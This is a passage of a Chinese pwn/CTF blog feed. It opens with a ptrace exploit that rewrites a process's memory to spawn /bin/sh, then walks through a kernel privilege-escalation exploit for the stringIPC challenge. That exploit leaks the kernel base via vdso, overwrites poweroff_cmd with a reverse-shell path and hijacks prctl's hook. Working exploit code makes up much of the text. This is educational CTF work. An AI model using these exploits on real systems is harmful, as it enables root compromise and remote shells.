class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ins;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr = <span class="number">0x40179d</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr_exit = <span class="number">0x401827</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> txt = <span class="number">0x402011</span>; <span class="comment">// readstory.txt</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [pid]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait(NULL);</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rip: %llx\n&quot;</span>,regs.rip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//puts after read patch</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr,    <span class="number">0x00000000c2c74890</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">8</span>,  <span class="number">0x2011bf00000000be</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">16</span>, <span class="number">0x0f0000003bb80040</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">24</span>, <span class="number">0x9090909090feeb05</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//patchout exit</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">0</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">2</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//readstory.txt is now /bin/sh</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, txt, <span class="number">0x68732f6e69622f</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, txt+<span class="number">8</span>, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>有了上面poc的支撑，我们就只需要把poc转换成汇编代码即可。这里采取的是orw方法获取flag。其实有了poc剩下的就是转换成汇编即可。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2022/trace_story/exploit.py">https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2022/trace_story/exploit.py</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-6-HijackPrctl</title>
      <link href="/2022/03/06/kernel-6-HijackPrctl/"/>
      <url>/2022/03/06/kernel-6-HijackPrctl/</url>
      
        <content type="html"><![CDATA[<p>内存任意读写劫持prctl实现提权。本篇包含了如何带符号调试exp以及使用gdb搜索内存的方法。</p><span id="more"></span><p>这次采用的题目是上次没有分析完的stringIPC。后者没有对写入位置限制，可以任意写，但是soild_core就只能写prctl了。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="prctl函数"><a href="#prctl函数" class="headerlink" title="prctl函数"></a>prctl函数</h2><p>在<a href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/sys.c#L2082">链接</a>中，可以找到调用，在<a href="https://elixir.bootlin.com/linux/v4.4.72/source/security/security.c#L988">链接</a>中可以找到定义。如下</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224170047364.png" alt="image-20220224170047364"></p><p>这里的<code>task_prctl</code>是一个虚表(类似函数指针)。如果能够劫持该表中的函数，就能够控制执行流。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224170356852.png" alt="image-20220224170356852"></p><p>那么prctl是干什么的？阅读man手册(这里截一张图就是因为我的背景好康)大致浏览了一下，能做的主要有设置线程属性，获取线程当前状态等。感觉还是很强的一个对进程管理相关的库。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224170811327.png" alt="image-20220224170811327"></p><p>我们通过调试，观察一下prctl的执行流程。</p><p>编写以下程序，并按照下图方式下断点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   prctl(<span class="number">0</span>,<span class="number">0</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep security_task_prctl</span><br></pre></td></tr></table></figure><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224203230818.png" alt="image-20220224203230818"></p><p>注意：==要在root环境下用si指令单步调试==如下所示，一定不能用ni。在如下位置就能找到prctl结构体位置。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220225204721714.png" alt="image-20220225204721714"></p><p>回到正题，这个虚函数被劫持之后，应该被修改成什么呢？用户态pwn可以修改为og，也可以是one_gadget，内核中没有相应的内容。这里一个从安卓root那里借鉴过来的办法是调用<code>call_usermodehelper</code>进行提权。</p><p>该函数签名如下，作用是可以以root权限执行用户空间代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_usermodehelper(cmdPath,cmdArgv,cmdEnvp,UMH_WAIT_PROC);</span><br></pre></td></tr></table></figure><p>但是不能直接劫持。因为<code>task_prctl</code>的第一个参数是一个int类型数值，这里只能写一个字符串。但是借用one_gadget思想，我们可能可以写入一个现成的函数，调用<code>call_usermodehelper</code>即可。</p><p>可以找到<a href="https://elixir.bootlin.com/linux/v4.4.72/source/arch/x86/kernel/cpu/mcheck/mce.c#L1324">以下</a>内容调用了。由于mce_helper是全局变量，应该也是可控的。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224213641803.png" alt="image-20220224213641803"></p><p>同样，<code>run_cmd</code>也会调用。<a href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/reboot.c#L416">源码</a></p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224214146761.png" alt="image-20220224214146761"></p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224214323810.png" alt="image-20220224214323810"></p><p>因此，只要劫持虚表到这两个函数，再修改他们中间参数的值(例如修改__orderly_power_off参数poweroff_cmd为我们要执行的文件路径即可。</p><h1 id="stringIPC"><a href="#stringIPC" class="headerlink" title="stringIPC"></a>stringIPC</h1><h2 id="获取内核基地址"><a href="#获取内核基地址" class="headerlink" title="获取内核基地址"></a>获取内核基地址</h2><p>我们先用<strong>stringIPC</strong>为例。</p><p>如果想要调用内核的符号，需要先获得基地址。在stringIPC中，我们只需要先获取vdso的地址，之后根据不变的偏移就能算出内核基地址。参考<a href="https://blog.csdn.net/seaaseesa/article/details/104694219">这篇文章</a>首先计算出name_addr在vdso中的偏移。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取vdso里的字符串&quot;gettimeofday&quot;相对vdso.so的偏移  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_gettimeofday_str_offset</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="comment">//获取当前程序的vdso.so加载地址0x7ffxxxxxxxx  </span></span><br><span class="line">   <span class="comment">//AT_SYSINFO_EHDR</span></span><br><span class="line">   <span class="comment">//        The address of a page containing the virtual Dynamic</span></span><br><span class="line">   <span class="comment">//        Shared Object (vDSO) that the kernel creates in order to</span></span><br><span class="line">   <span class="comment">//        provide fast implementations of certain system calls.</span></span><br><span class="line">   <span class="comment">// 注意，只是返回加载vdso的页面，我们还需要从该页面中找到vdso位置</span></span><br><span class="line">   <span class="comment">// 即使找到了该位置，也需要在内核映射区域中找到vdso.so</span></span><br><span class="line">   <span class="type">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);  </span><br><span class="line">   <span class="type">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;  </span><br><span class="line">   <span class="keyword">if</span> (!vdso_addr) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="comment">//仅需要搜索1页大小即可，因为vdso映射就一页0x1000  </span></span><br><span class="line">   <span class="type">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));  </span><br><span class="line">   <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> name_addr - vdso_addr;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>关于为什么”即使找到了该位置，也需要在内核映射区域中找到vdso.so”，在下面是解释。</p><p>不知道getauxval(AT_SYSINFO_EHDR)是什么意思，写个程序测试一下。可以看到打印的数值其实是0x7f开头的。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224220837748.png" alt="image-20220224220837748"></p><p>看下面的map图，找到其实是vdso部分的地址，并不是vsycall的地址。因此我们还需要在vsycall中找到vdso。这样才能找到内核基地址。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220224220923315.png" alt="image-20220224220923315"></p><p>那么怎么找呢？<strong>由于vdso.so是按照页加载的，因此gettimeofday()中的字符串页偏移量是固定的。我们可以在OS映射vdso的所有可能大小中找到有相同偏移的那一页，就说明找到了vdso的起始地址</strong>。而有了起始地址，我们就可以算出内核基地址。(可以这样理解:vdso这个页面相当于一个共享库函数，只不过是按照页面加载的。有了共享库函数的地址，我们又可以在root下找到内核加载基地址，就能够算出来两者的偏移了)</p><p>采用以下代码找到。其中映射范围是根据OS的映射规则找到的。<a href="https://blog.csdn.net/seaaseesa/article/details/104694219">这篇文章</a>有映射规则的图。利用stringIPC的任意地址读就可以找到。以下代码也是参考这篇文章。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr &lt; <span class="number">0xffffffffffffefff</span>;addr += <span class="number">0x1000</span>) &#123;</span><br><span class="line">    arbitrary_read(id,buf,addr,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// 找到的依据是: 从0x1000开始相同偏移的地方有相同字符串gettimeofday</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf+gettimeofday_str_offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]find vdso\n&quot;</span>);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]vdso in kernel addr=0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后根据vdso可以计算出内核基地址。首先看到的是vdso的地址</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220225200939874.png" alt="image-20220225200939874"></p><p>接着获取内核加载地址。在root中可以看到内核基地址。可以看到vdso和内核基地址相差0xe04000。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220225201842182.png" alt="image-20220225201842182"></p><p>接着我们想找到上面说的类似one_gadget函数的偏移，以及要修改的相应符号地址。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220225202538188.png" alt="image-20220225202538188"></p><p>分别计算出他们的偏移。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POWEROFF_CMD 0xE4DFA0 <span class="comment">// poweroff_cmd字符串地址</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORDERLY_POWEROFF 0xa3480 <span class="comment">// orderly_poweroff的函数地址,在上面的图里面有</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_PRCTL 0xeb7DF8 <span class="comment">// task_prctl的地址,在上面有相应的图，就是ebp+0x18，call的位置</span></span></span><br></pre></td></tr></table></figure><p>我们的思路是：</p><ol><li>利用任意写修改poweroff_cmd为我们可以反弹的shell的二进制文件(这里就是下面的reverse_shell)</li><li>利用任意写修改prctl结构体为poweroff的函数地址，于是执行prctl的时候会调用poweroff</li><li>由于poweroff_cmd已经被修改，现在调用prctl会触发rum_cmd(poweroff_cmd)也就是能执行我们的reverse_shell二进制文件。</li></ol><p>如下为拿到地址之后的写入代码。还是比较简单的。<strong>但是这里还是没有明白为什么减去0x10，以及如何调试这样的.c程序呢？？==答: add-symbol-file exp==即可。如果想要-g带源码调试，只需要将源码和exp放在同一路径下即可。或者参考我之前一篇<a href="https://blog.csdn.net/weixin_46521144/article/details/120861584">关于gdb的dir的博客</a></strong></p><p>下图为调试过程。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220306153733339.png" alt="劫持poweroff_cmd"></p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220306154103260.png" alt="劫持函数指针"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入reverse_shell二进制文件路径到poweroff_cmd中</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="string">&#x27;\x0&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buf,<span class="string">&quot;/reverse_shell\0&quot;</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = poweroff_cmd_addr<span class="number">-0x10</span>; <span class="comment">// 这里-0x10是调试看出来的</span></span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf);</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br></pre></td></tr></table></figure><p>另外，gdb中的search对于qemu中寻找相应字符串似乎匹配的非常慢。如果没找到地址可能还是要在附近搜索，而不能直接search。用以下方法可能更加方便。其中地址选择就是从内核映射的基地址开始找到末尾即可。</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220306154741182.png" alt="image-20220306154741182"></p><p>以下为成功截图</p><p><img src="/2022/03/06/kernel-6-HijackPrctl/image-20220306151109933.png" alt="image-20220306151109933"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attack_prctl.c</span></span><br><span class="line"><span class="comment">// gcc -static -g attack_prctl.c -o attack_prctl_no_my</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>       </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">// for memmem</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>    <span class="comment">/* BSD and Linux */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span> <span class="comment">// for getgid()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// for system(&quot;/bin/sh&quot;)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/auxv.h&gt;</span> <span class="comment">// for search gettimeofday()</span></span></span><br><span class="line"><span class="comment">// search string input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"><span class="comment">// #define POWEROFF_CMD 0xE4DFA0</span></span><br><span class="line"><span class="comment">// #define ORDERLY_POWEROFF 0xa3480 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// nerwork</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POWEROFF_CMD 0xe4dfa0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORDERLY_POWEROFF 0xa3480</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_PRCTL 0xeb7DF8 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_gettimeofday_str_offset</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="comment">//AT_SYSINFO_EHDR</span></span><br><span class="line">   <span class="comment">//        The address of a page containing the virtual Dynamic</span></span><br><span class="line">   <span class="comment">//        Shared Object (vDSO) that the kernel creates in order to</span></span><br><span class="line">   <span class="comment">//        provide fast implementations of certain system calls.</span></span><br><span class="line">   <span class="type">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);  </span><br><span class="line">   <span class="type">char</span>* name = <span 